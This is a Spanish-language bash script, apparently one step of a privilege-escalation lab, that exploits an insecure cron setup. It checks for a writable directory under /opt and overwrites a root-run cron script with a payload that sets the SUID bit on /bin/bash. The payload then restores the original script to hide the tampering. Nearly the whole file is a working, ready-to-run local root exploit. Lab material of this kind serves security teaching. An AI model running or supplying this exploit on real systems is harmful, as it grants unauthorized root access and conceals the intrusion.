#!/bin/bash
# 01_exploit.sh - Script para ejecutar la explotación de Cron Inseguro
# Este script DEBE ejecutarse como un usuario NO-ROOT.

echo "--- Iniciando intento de explotación Cron Inseguro ---"

# --- Paso 1: Verificar el usuario actual ---
echo "[1/3] Verificando usuario actual..."
CURRENT_USER=$(whoami)
echo "    Actualmente logueado como: $CURRENT_USER"
if [ "$CURRENT_USER" == "root" ]; then
    echo "ADVERTENCIA: Estás como root. Este script debe ser ejecutado por un usuario no-root."
    echo "Por favor, sal de la sesión de root y ejecuta como un usuario normal."
    exit 1
fi

# --- Paso 2: Verificar la capacidad de escritura en el directorio vulnerable ---
VULN_DIR="/opt/insecure_cron_scripts"
VULN_SCRIPT="$VULN_DIR/daily_report.sh"
echo "[2/3] Verificando permisos de escritura en el directorio: $VULN_DIR"
touch "$VULN_DIR/test_file" 2>/dev/null
if [ -f "$VULN_DIR/test_file" ]; then
    rm "$VULN_DIR/test_file"
    echo "    ¡El directorio es escribible! (Vulnerabilidad confirmada)."
else
    echo "ERROR: No se puede escribir en el directorio $VULN_DIR. La vulnerabilidad no está presente."
    echo "Revisa el script '00_setup_lab.sh' y los permisos del directorio."
    exit 1
fi

# --- Paso 3: Modificar el script de cron para escalar privilegios ---
echo "[3/3] Modificando el script de cron para establecer el bit SUID en /bin/bash..."
# Este payload dará al /bin/bash el bit SUID y luego restaurará el script original
tee "$VULN_SCRIPT" > /dev/null <<EOF
#!/bin/bash
echo "[ATAQUE]: ¡Payload de escalada de privilegios ejecutado por Root!"
/bin/chmod u+s /bin/bash # Establece el bit SUID en /bin/bash

# --- Limpieza automática del script para evitar ejecuciones repetidas y revertir ---
echo "#!/bin/bash" > "$VULN_SCRIPT"
echo "echo \"[CRON_ROOT]: Reporte diario ejecutado por root en \$(date)\" >> /var/log/daily_report.log" >> "$VULN_SCRIPT"
echo "/bin/echo \"[CRON_ROOT]: Simulando tarea de reporte...\"" >> "$VULN_SCRIPT"
# --- Fin de la limpieza ---
EOF
chmod +x "$VULN_SCRIPT"
echo "    Script 'daily_report.sh' modificado con payload."

echo ""
echo "--- ESPERA 60 SEGUNDOS ---"
echo "El cron job se ejecuta cada minuto. El payload se activará pronto."
echo "Después de esperar, ejecuta './02_verify_exploit.sh' para ver si eres root."
echo ""